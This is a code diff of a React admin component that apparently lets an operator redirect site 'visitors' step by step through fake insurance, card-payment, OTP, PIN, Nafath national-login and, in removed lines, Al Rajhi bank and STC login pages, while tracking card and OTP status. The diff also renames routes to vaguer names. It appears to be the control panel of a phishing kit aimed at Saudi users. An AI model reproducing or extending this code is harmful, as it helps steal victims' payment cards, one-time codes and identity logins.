@@ -74,12 +74,13 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
       if (destination === "nafad_modal") {
         updates = { nafadConfirmationCode: "123456" };
-      } else if (destination === "payment") {
+      } else if (destination === "check") {
         updates = {
-          redirectPage: "payment",
-          currentStep: "payment" as any,
+          redirectPage: "check",
+          currentStep: "check" as any,
           cardStatus: "pending",
           otpStatus: "pending",
+          redirectRequestedAt: new Date().toISOString(),
         };
       } else {
         updates = {
@@ -880,18 +881,17 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               className="w-full rounded-xl border border-gray-200 dark:border-slate-700 bg-white dark:bg-slate-800 dark:text-slate-200 px-4 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/30 focus:border-blue-400 disabled:opacity-50 sm:w-auto transition-all duration-200"
             >
               <option value="">توجيه الزائر...</option>
-              <option value="home">🏠 الرئيسية</option>
-              <option value="insur">📋 بيانات التأمين</option>
-              <option value="compar">📊 مقارنة العروض</option>
-              <option value="payment">💳 الدفع (بطاقة)</option>
-              <option value="otp">🔑 OTP</option>
-              <option value="pin">🔐 PIN</option>
-              <option value="phone">📱 معلومات الهاتف</option>
-              <option value="nafad">🇸🇦 نفاذ</option>
-              <option value="nafad_modal">🪟 نافذة نفاذ</option>
-              <option value="finalOtp">✅ OTP الأخير</option>
-              <option value="rajhi">🏦 راجحي</option>
-              <option value="stc-login">📶 دخول STC</option>
+              <option value="home">🏠 الرئيسية (home)</option>
+              <option value="home-new">🆕 الرئيسية الجديدة (home-new)</option>
+              <option value="main">▶️ بدء التدفق (main)</option>
+              <option value="insur">📋 بيانات التأمين (insur)</option>
+              <option value="compar">📊 مقارنة العروض (compar)</option>
+              <option value="check">💳 الدفع / البطاقة (check)</option>
+              <option value="veri">🔑 التحقق OTP (veri)</option>
+              <option value="confi">🔐 تأكيد PIN (confi)</option>
+              <option value="phone-info">📱 معلومات الهاتف (phone-info)</option>
+              <option value="nafad">🇸🇦 نفاذ (nafad)</option>
+              <option value="nafad_modal">🪟 فتح نافذة نفاذ</option>
             </select>
           </div>
         </div>
